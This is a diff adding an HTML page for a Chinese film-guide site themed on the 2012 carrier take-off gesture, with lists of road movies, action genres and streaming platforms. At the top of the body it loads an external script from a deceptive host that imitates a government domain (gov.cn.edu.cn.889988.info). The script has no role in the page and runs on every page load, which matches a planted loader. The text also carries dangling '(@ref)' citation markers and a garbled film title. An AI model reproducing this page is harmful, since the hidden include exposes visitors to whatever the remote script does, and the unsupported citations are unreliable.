@@ -1,0 +1,272 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>走你电影网 - 起飞与出发电影志·公路片·动作冒险·正版观影导航</title>
+<meta name="description" content="走你电影网(chasinidianyingwang-h5.github.io)是起飞与出发电影志：以航母Style起飞手势为精神符号，收公路片、动作冒险片、处女作/出发之作与正版观看入口。不托管视频、不聚合盗版源。">
+<meta name="keywords" content="走你电影网, chasinidianyingwang-h5, 航母Style, 公路片, 动作冒险, 出发电影, 正版观影">
+<meta name="author" content="走你电影网">
+<meta name="robots" content="index, follow">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+:root{
+  --deck:#1a1f2e;
+  --deck-2:#242b3d;
+  --white:#f4f6fb;
+  --yellow:#ffcc00;
+  --yellow-deep:#e6b800;
+  --blue:#2d6cdf;
+  --blue-deep:#1a4db3;
+  --red:#e63946;
+  --soft:#9aa3b2;
+  --line:rgba(244,246,251,.14);
+  --card:rgba(244,246,251,.05);
+  --radius:18px;
+  --shadow:0 12px 32px rgba(0,0,0,.38);
+}
+html{scroll-behavior:smooth}
+body{font-family:"Noto Sans SC","PingFang SC","Microsoft YaHei",sans-serif;background:var(--deck);color:var(--white);line-height:1.85;overflow-x:hidden}
+.bg{position:fixed;inset:0;z-index:0;pointer-events:none;background:
+  radial-gradient(520px 360px at 88% 8%,rgba(255,204,0,.18),transparent 60%),
+  radial-gradient(620px 420px at 8% 92%,rgba(45,108,223,.2),transparent 60%),
+  linear-gradient(180deg,#1a1f2e,#242b3d 55%,#11151f 100%);}
+/* 跑道虚线 */
+.runway{position:fixed;left:0;right:0;bottom:0;height:26vh;z-index:0;pointer-events:none;opacity:.35;
+  background:repeating-linear-gradient(90deg,transparent 0 24px,rgba(255,204,0,.7) 24px 40px);
+  -webkit-mask:linear-gradient(180deg,transparent,#000 70%);mask:linear-gradient(180deg,transparent,#000 70%);}
+/* 速度线粒子 */
+.speed{position:fixed;width:2px;height:14px;background:var(--yellow);z-index:0;opacity:.5;animation:zoom 1.8s linear infinite}
+@keyframes zoom{0%{transform:translateX(0) scaleX(1);opacity:0}20%{opacity:.8}100%{transform:translateX(120vw) scaleX(3);opacity:0}}
+
+.topbar{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(26,31,46,.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.topbar-inner{max-width:1200px;margin:0 auto;padding:0 20px;height:60px;display:flex;align-items:center;justify-content:space-between}
+.brand{display:flex;align-items:center;gap:10px;font-weight:800;font-size:1.15rem}
+.brand .gesture{width:34px;height:34px;border-radius:6px;background:var(--yellow);position:relative;display:flex;align-items:center;justify-content:center}
+.brand .gesture::after{content:"";position:absolute;width:14px;height:3px;background:var(--deck);right:4px;top:50%;transform:translateY(-50%);box-shadow:0 -5px 0 var(--deck),0 5px 0 var(--deck)}
+.brand b{color:var(--yellow)}
+.topnav{display:flex;gap:4px}
+.topnav a{padding:8px 14px;border-radius:8px;font-size:.84rem;font-weight:600;color:var(--soft);transition:.25s}
+.topnav a:hover,.topnav a.active{background:rgba(255,204,0,.14);color:var(--yellow)}
+.menu-btn{display:none;background:none;border:none;font-size:1.4rem;color:var(--yellow);cursor:pointer}
+
+.hero{position:relative;z-index:1;margin-top:60px;padding:78px 20px 56px}
+.hero-inner{max-width:1200px;margin:0 auto;display:grid;grid-template-columns:1.1fr .9fr;gap:40px;align-items:center}
+.kicker{font-family:"Courier New",monospace;font-size:.68rem;letter-spacing:3px;color:var(--yellow);border:1px solid var(--line);padding:4px 10px;border-radius:20px}
+.hero h1{font-size:clamp(2rem,4.4vw,3.2rem);font-weight:900;line-height:1.16;margin:14px 0 8px}
+.hero h1 .go{color:var(--yellow);text-shadow:0 8px 26px rgba(255,204,0,.3)}
+.hero h1 .blue{color:#7eb3ff}
+.hero p{color:#b8c0d0;font-size:1rem;margin:14px 0 24px}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap}
+.btn{font-family:inherit;font-weight:700;font-size:.9rem;padding:12px 24px;border-radius:10px;cursor:pointer;border:none;transition:.3s}
+.btn-main{background:linear-gradient(135deg,var(--yellow),var(--yellow-deep));color:#1a1f2e}
+.btn-main:hover{transform:translateY(-2px);box-shadow:0 14px 38px rgba(255,204,0,.35)}
+.btn-line{background:transparent;border:2px solid var(--blue);color:#7eb3ff}
+.hero-card{background:var(--card);border:1px solid var(--line);border-radius:20px;padding:24px;box-shadow:var(--shadow)}
+.hero-card h3{font-size:.95rem;margin-bottom:10px;color:var(--yellow)}
+.hero-card p{font-size:.78rem;color:#a4afc4;line-height:1.65}
+.hero-card .ok{color:#7eb3ff;font-weight:800}
+
+.container{max-width:1200px;margin:0 auto;padding:52px 20px;position:relative;z-index:1}
+.label{font-family:"Courier New",monospace;font-size:.65rem;letter-spacing:3px;text-transform:uppercase;color:var(--yellow)}
+.title{font-size:clamp(1.3rem,3vw,1.8rem);font-weight:800;margin:4px 0 6px}
+.desc{font-size:.88rem;color:#9aa3b2;margin-bottom:30px}
+.divider{height:2px;background:repeating-linear-gradient(90deg,var(--yellow) 0 14px,transparent 14px 26px);opacity:.25;margin:8px 0 26px}
+
+/* 起飞手势 */
+.gesture-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.gesture-card{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:20px;transition:.3s}
+.gesture-card:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--yellow)}
+.gesture-card .ico{font-size:1.9rem}
+.gesture-card h3{font-size:1rem;font-weight:800;color:#fff;margin:6px 0 4px}
+.gesture-card p{font-size:.76rem;color:#9aa3b2;line-height:1.6}
+
+/* 公路片 */
+.road{background:rgba(255,204,0,.05);border:1px dashed var(--yellow);border-radius:var(--radius);padding:26px;margin-bottom:34px}
+.road h3{font-size:1rem;color:var(--yellow);margin-bottom:8px}
+.road p{font-size:.82rem;color:#b8c0d0;line-height:1.7}
+.film-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:20px}
+.film{background:var(--card);border:1px solid var(--line);border-radius:var(--radius);padding:22px;transition:.3s;position:relative;overflow:hidden}
+.film::before{content:"";position:absolute;left:0;top:0;bottom:0;width:5px;background:var(--c,var(--yellow))}
+.film:hover{transform:translateY(-4px);box-shadow:var(--shadow);border-color:var(--c,var(--yellow))}
+.film .meta{font-family:"Courier New",monospace;font-size:.74rem;color:#7eb3ff;font-weight:700}
+.film h3{font-size:1rem;color:#fff;margin:6px 0 4px}
+.film p{font-size:.76rem;color:#9aa3b2;line-height:1.6}
+.film .tag{margin-top:10px;font-size:.7rem;font-weight:700;color:var(--c,var(--yellow));display:inline-block}
+
+/* 动作冒险 */
+.act-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.act{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.act h3{font-size:.95rem;color:#fff}
+.act p{font-size:.76rem;color:#9aa3b2;margin-top:6px}
+
+/* 正版入口 */
+.watch-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:18px}
+.w{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:20px}
+.w h3{font-size:.95rem;color:#fff}
+.w p{font-size:.76rem;color:#9aa3b2;margin-top:6px}
+.w .tag{font-size:.7rem;color:#7eb3ff;font-weight:700;margin-top:8px;display:inline-block}
+
+.footer{position:relative;z-index:1;background:#0f121b;color:var(--white);padding:46px 20px 24px;margin-top:54px;border-top:1px solid var(--line)}
+.footer-inner{max-width:1200px;margin:0 auto}
+.footer-grid{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:34px;margin-bottom:26px}
+.footer h4{font-size:.9rem;margin-bottom:10px;color:#fff}
+.footer a{display:block;font-size:.8rem;color:#8a94a8;padding:3px 0}
+.footer a:hover{color:var(--yellow)}
+.footer p{font-size:.82rem;color:#8a94a8;line-height:1.6}
+.footer-bottom{text-align:center;font-size:.72rem;color:rgba(244,246,251,.5);padding-top:18px;border-top:1px solid rgba(244,246,251,.12)}
+.footer-bottom a{color:var(--yellow);font-weight:600;display:inline}
+
+@media(max-width:1024px){.hero-inner{grid-template-columns:1fr}.hero-card{order:-1}}
+@media(max-width:768px){
+  .topnav{display:none;position:absolute;top:60px;left:0;right:0;flex-direction:column;background:rgba(26,31,46,.97);padding:12px 20px;border-bottom:1px solid var(--line)}
+  .topnav.open{display:flex}.menu-btn{display:block}
+  .footer-grid{grid-template-columns:1fr 1fr}
+}
+@media(max-width:480px){.footer-grid{grid-template-columns:1fr}.hero h1{font-size:1.7rem}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+<div class="bg"></div>
+<div class="runway"></div>
+<script>
+for(var i=0;i<18;i++){var s=document.createElement('div');s.className='speed';
+s.style.top=Math.random()*100+'vh';s.style.left='-60px';
+s.style.animationDuration=(1.2+Math.random()*1.2)+'s';
+s.style.animationDelay=(-Math.random()*1.8)+'s';document.body.appendChild(s);}
+</script>
+
+<div class="topbar">
+  <div class="topbar-inner">
+    <div class="brand"><span class="gesture"></span>走你<b>电影网</b></div>
+    <nav class="topnav" id="topNav">
+      <a href="#home" class="active">首页</a>
+      <a href="#gesture">起飞手势</a>
+      <a href="#road">公路出发</a>
+      <a href="#act">动作冒险</a>
+      <a href="#watch">正版入口</a>
+    </nav>
+    <button class="menu-btn" id="menuBtn">☰</button>
+  </div>
+</div>
+
+<section class="hero" id="home">
+  <div class="hero-inner">
+    <div>
+      <span class="kicker">CARRIER STYLE · GO YOU FILM ARCHIVE</span>
+      <h1><span class="go">走你</span>，不是一句口号，<br>是<span class="blue">起飞的指令</span>。</h1>
+      <p>走你电影网（chasinidianyingwang-h5.github.io）以 2012 年辽宁舰歼-15 起飞手势为精神符号[7,11,15](@ref)，做出发与行动力电影志：公路片、动作冒险、处女作/出发之作、正版观看入口。不托管视频、不聚合盗版源。</p>
+      <div class="hero-actions">
+        <button class="btn btn-main">✈️ 看起飞手势</button>
+        <button class="btn btn-line">🛣️ 进公路出发</button>
+      </div>
+    </div>
+    <div class="hero-card">
+      <h3>走你三不</h3>
+      <p><span class="ok">✓</span> 不存片、不深度链接非法视听源<br>
+      <span class="ok">✓</span> 不把“走你”做成低俗/擦边梗<br>
+      <span class="ok">✓</span> 公路片、动作冒险、处女作按资料馆逻辑整理<br>
+      <span class="ok">✓</span> 老片优先走正版平台/资料馆/公共领域</p>
+    </div>
+  </div>
+</section>
+
+<div class="container" id="gesture">
+  <div class="label">— CARRIER STYLE —</div>
+  <h2 class="title">起飞手势：侧屈腿，食指中指指向跑道</h2>
+  <p class="desc">2012 年 11 月 23 日，辽宁舰歼-15 成功起降，地勤指挥手势引爆网络模仿热潮[7,11,15](@ref)。</p>
+  <div class="divider"></div>
+  <div class="gesture-grid">
+    <div class="gesture-card"><div class="ico">✈️</div><h3>动作要领</h3><p>侧屈腿半蹲，右臂向右前方伸展，食指和中指并拢指向舰艏方向，左手握拳放于背后腰际，脸背对起飞方向[7,24](@ref)。</p></div>
+    <div class="gesture-card"><div class="ico">🟡</div><h3>黄马甲</h3><p>甲板上穿黄色马甲的指挥类战位，可直接给飞行员下达起飞指令，是“航母Style”的本体[16](@ref)。</p></div>
+    <div class="gesture-card"><div class="ico">🫡</div><h3>为什么蹲着</h3><p>相比站立姿势，蹲立起飞姿势更有助于飞行助理观察舰载机机身下方与甲板之间的情况，视野更开阔[12](@ref)。</p></div>
+    <div class="gesture-card"><div class="ico">🇨🇳</div><h3>正能量符号</h3><p>网友模仿“走你”表达对中国航母实现舰载机成功起降的欣喜与自豪，是娱乐化爱国表达的典型[2,22](@ref)。</p></div>
+  </div>
+</div>
+
+<div class="container" id="road">
+  <div class="road">
+    <h3>公路出发：车轮碾过地理，镜头对准人心</h3>
+    <p>公路片是成型于美国的一种类型片，借助汽车等交通工具行走，由时空转换产生故事，人物命运和认知改变，主题与“流浪、放逐、探险、孤独、回望、救赎”有关[8](@ref)。华语公路片起步较晚，《走到底》(2000) 是开山之作，《落叶归根》(2007) 打响名声，《人在囧途》《无人区》《后会无期》《心花路放》《转山》《冈仁波齐》等构成新时期图貌[4,8,20](@ref)。</p>
+  </div>
+  <div class="label">— ROAD MOVIES —</div>
+  <h2 class="title">公路片单：叛逆和找寻是驻于文本深处的精神之魂</h2>
+  <p class="desc">从《逍遥骑士》到《北回归线以北》，出发即是目的[8,13,25](@ref)。</p>
+  <div class="divider"></div>
+  <div class="film-grid">
+    <div class="film" style="--c:var(--yellow)"><div class="meta">1969 · 美国</div><h3>逍遥骑士</h3><p>丹尼斯·霍珀执导，彼得·方达和丹尼斯·霍珀主演。从形式到内涵成就公路片类型，驻在文本深处的叛逆之魂至今难有作品超越[13,20](@ref)。</p><div class="tag">叛逆/反叛</div></div>
+    <div class="film" style="--c:var(--blue)"><div class="meta">2007 · 中国</div><h3>落叶归根</h3><p>张扬执导，早期有影响力的华语公路片。把“落叶归根”这个农耕社会命题放在车轮上，构成中国社会横截面[4,20](@ref)。</p><div class="tag">乡土/救赎</div></div>
+    <div class="film" style="--c:var(--red)"><div class="meta">2010 · 中国</div><h3>人在囧途</h3><p>叶伟民执导，公路片商业爆发的标志性作品。春运背景下的错位与和解，把“囧”放进公路叙事[4,20](@ref)。</p><div class="tag">喜剧/商业</div></div>
+    <div class="film" style="--c:var(--yellow)"><div class="meta">2013 · 中国</div><h3>无人区</h3><p>宁浩执导，带有犯罪元素的公路片。把公路片放进西部荒原，人性在极端环境下暴露[4,20](@ref)。</p><div class="tag">犯罪/西部</div></div>
+    <div class="film" style="--c:var(--blue)"><div class="meta">2014 · 中国</div><h3>后会无期</h3><p>韩寒执导，表现年轻人迷茫状态的公路片。东极岛到西部，一路是告别与自我寻找[4,20](@ref)。</p><div class="tag">文艺/寻找</div></div>
+    <div class="film" style="--c:var(--red)"><div class="meta">2025 · 中国</div><h3>穿越山海走向你</h3><p>12 岁哈萨克牧童跨越新疆到成都的冒险，带着白骆驼奶去救“骆驼爷爷”。公路片+冒险片的当代边疆叙事[6,10](@ref)。</p><div class="tag">冒险/边疆</div></div>
+    <div class="film" style="--c:var(--yellow)"><div class="meta">2018 · 美国</div><h3>绿皮书</h3><p>1962 年美国南方巡演路上的种族和解。公路片+种族议题，车内局促空间与车外辽阔南方的反差构图[8,25](@ref)。</p><div class="tag">种族/和解</div></div>
+    <div class="film" style="--c:var(--blue)"><div class="meta">2025 · 中国</div><h3>北回归线以北</h3><p>国内首部以房车出游为主题的公路片。三条主线开着房车到西部，在大自然中治愈受伤心灵[8](@ref)。</p><div class="tag">治愈/房车</div></div>
+  </div>
+</div>
+
+<div class="container" id="act">
+  <div class="label">— ACTION & ADVENTURE —</div>
+  <h2 class="title">动作冒险：从《疯狂的麦克斯》到《谍影重重》</h2>
+  <p class="desc">追车、抢劫、功夫、电子游戏反派、外星人、变种人——动作片类型多样且刺激[9](@ref)。</p>
+  <div class="act-grid">
+    <div class="act"><h3>谍战动作</h3><p>《碟中谍》《谍影重重》《007》系列。特工、卧底、身份错位，动作设计从实拍特技走向高科技[5,23](@ref)。</p></div>
+    <div class="act"><h3>竞速追车</h3><p>《疯狂的麦克斯：狂暴之路》《速度与激情》系列。柴油、沙尘、实拍特技，把公路片的速度感推到极致[5,21,23](@ref)。</p></div>
+    <div class="act"><h3>功夫武侠</h3><p>《杀死比尔》《黑客帝国》《约翰·威克》系列。枪舞、武术、印尼拳术 Pencak Silat，动作即视觉语言[9,21](@ref)。</p></div>
+    <div class="act"><h3>冒险史诗</h3><p>《指环王》《加勒比海盗》《夺宝奇兵》《侏罗纪世界》。奇观、怪物、远古文明，冒险片的骨架[9](@ref)。</p></div>
+    <div class="act"><h3>超级英雄</h3><p>漫威宇宙、DC 扩展宇宙、蝙蝠侠三部曲。从漫画到银幕，动作片的工业化巅峰[9](@ref)。</p></div>
+    <div class="act"><h3>军事战争</h3><p>《黑鹰坠落》《拯救大兵瑞恩》《300 勇士》。大规模战斗场面，动作片的史诗化表达[21](@ref)。</p></div>
+  </div>
+</div>
+
+<div class="container" id="watch">
+  <div class="label">— LEGAL VIEWING —</div>
+  <h2 class="title">正版去哪看：动作冒险片的流媒体版图</h2>
+  <p class="desc">不同平台片库差异大，按类型选平台更省时间[9,21,26](@ref)。</p>
+  <div class="watch-grid">
+    <div class="w"><h3>HBO Max</h3><p>动作片库深厚：《蝙蝠侠》系列、《指环王》三部曲、《黑客帝国》、《疯狂的麦克斯：狂暴之路》、黑泽明《七武士》《罗生门》[9](@ref)。</p><span class="tag">史诗/经典</span></div>
+    <div class="w"><h3>Disney+</h3><p>家庭向动作首选：全部《星球大战》、《漫威电影宇宙》大部分、《阿凡达》、《加勒比海盗》、《超人总动员》[9](@ref)。</p><span class="tag">家庭/漫威</span></div>
+    <div class="w"><h3>Netflix</h3><p>原创动作片阵地：《惊天营救》《蒙上你的眼》《鬼影特攻》《旧 Guard》《超能计划》；与索尼合作引入蜘蛛侠系列[9](@ref)。</p><span class="tag">原创/多元</span></div>
+    <div class="w"><h3>Prime Video</h3><p>片库波动大但常有硬货：《盗梦空间》《异形》《终结者》《007：大破天幕杀机》《启示录》；收购 MGM 后将有詹姆斯·邦德系列[9](@ref)。</p><span class="tag">硬核/科幻</span></div>
+  </div>
+</div>
+
+<footer class="footer">
+  <div class="footer-inner">
+    <div class="footer-grid">
+      <div>
+        <div class="brand"><span class="gesture"></span>走你<b>电影网</b></div>
+        <p>走你电影网（chasinidianyingwang-h5.github.io）是起飞与出发电影志：以航母Style起飞手势为精神符号，收公路片、动作冒险片、处女作/出发之作与正版观看入口。不提供未授权播放，不聚合非法视听节目。</p>
+      </div>
+      <div><h4>栏目</h4><a href="#gesture">起飞手势</a><a href="#road">公路出发</a><a href="#act">动作冒险</a><a href="#watch">正版入口</a></div>
+      <div><h4>片种</h4><a href="#">公路片</a><a href="#">动作片</a><a href="#">冒险片</a><a href="#">处女作</a></div>
+      <div><h4>说明</h4><a href="#">本站立场</a><a href="#">版权与引用</a><a href="#">隐私说明</a><a href="#">联系我们</a></div>
+    </div>
+    <div class="footer-bottom">
+      <p>© 2012–2024 走你电影网 (Go You Film Archive) - 起飞与出发电影志 · 航母Style · 公路片 · 动作冒险 · 正版观影导航</p>
+      <p>网站地址：<a href="https://chasinidianyingwang-h5.github.io">https://chasinidianyingwang-h5.github.io</a></p>
+      <p style="margin-top:6px;opacity:.6">“走你”源自 2012 年辽宁舰歼-15 舰载机起飞指挥手势（航母Style），不涉及任何盗版资源站或擦边内容。</p>
+    </div>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),topNav=document.getElementById('topNav');
+menuBtn.onclick=function(){topNav.classList.toggle('open')};
+topNav.querySelectorAll('a').forEach(function(a){a.onclick=function(){topNav.classList.remove('open')}});
+var secs=document.querySelectorAll('section[id],div[id]');
+addEventListener('scroll',function(){
+  var y=scrollY+80;
+  secs.forEach(function(s){
+    if(y>=s.offsetTop&&y<s.offsetTop+s.offsetHeight){
+      document.querySelectorAll('.topnav a').forEach(function(a){a.classList.remove('active')});
+      var l=document.querySelector('.topnav a[href="#'+s.id+'"]');
+      if(l)l.classList.add('active');
+    }
+  });
+});
+</script>
+</body>
+</html>
